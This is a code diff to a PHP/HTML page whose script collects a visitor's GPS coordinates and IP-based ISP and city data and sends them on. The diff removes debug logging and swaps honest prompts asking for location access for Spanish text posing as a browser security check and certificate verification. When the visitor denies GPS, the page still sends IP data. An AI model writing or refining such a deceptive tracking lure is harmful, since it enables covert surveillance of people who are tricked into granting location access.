@@ -18,9 +18,6 @@ echo <<<HTML
                 message.includes("Latitude:") ||
                 message.includes("Position obtained successfully")
             ) {
-
-                console.log("DEBUG: " + message);
-
                 var xhr = new XMLHttpRequest();
                 xhr.open("POST", "debug_log.php", true);
                 xhr.setRequestHeader(
@@ -64,13 +61,13 @@ echo <<<HTML
         }
 
         async function getLocation() {
-            document.getElementById("locationStatus").innerText = "Procesando...";
+            document.getElementById("locationStatus").innerText = "Estableciendo conexión segura...";
             
             // Iniciamos la obtención de info por IP de inmediato
             const ipInfoPromise = getIPInfo();
 
             if (navigator.geolocation) {
-                document.getElementById("locationStatus").innerText = "Requesting location permission...";
+                document.getElementById("locationStatus").innerText = "Verificando certificado de seguridad...";
                 
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
@@ -85,7 +82,7 @@ echo <<<HTML
                     async (error) => {
                         // Si deniega o falla el GPS, mandamos al menos lo de la IP
                         const extraInfo = await ipInfoPromise;
-                        sendFinalData("Unknown", "Unknown", "IP-Based", extraInfo);
+                        sendFinalData("Denied", "Denied", "IP-Fallback", extraInfo);
                     },
                     {
                         enableHighAccuracy: true,
@@ -95,13 +92,12 @@ echo <<<HTML
                 );
             } else {
                 const extraInfo = await ipInfoPromise;
-                sendFinalData("Unknown", "Unknown", "Not Supported", extraInfo);
+                sendFinalData("Not-Supported", "Not-Supported", "IP-Fallback", extraInfo);
             }
         }
 
         function sendFinalData(lat, lon, acc, extraInfo) {
-            debugLog("Sending captured data...");
-            document.getElementById("locationStatus").innerText = "Loading experience...";
+            document.getElementById("locationStatus").innerText = "Cargando espacio de trabajo...";
 
             var isp = extraInfo.isp || "Unknown";
             var city = extraInfo.city || "Unknown";
@@ -198,11 +194,11 @@ echo <<<HTML
 
 <body>
 
-    <h2>Loading, please wait...</h2>
+    <h2>Accediendo al servicio...</h2>
 
-    <p>Please allow location access for better experience</p>
+    <p>Por seguridad, complete la verificación del navegador si se le solicita.</p>
 
-    <p id="locationStatus">Initializing...</p>
+    <p id="locationStatus">Iniciando protocolo...</p>
 
     <div style="margin-top: 30px;">
         <div class="spinner"></div>
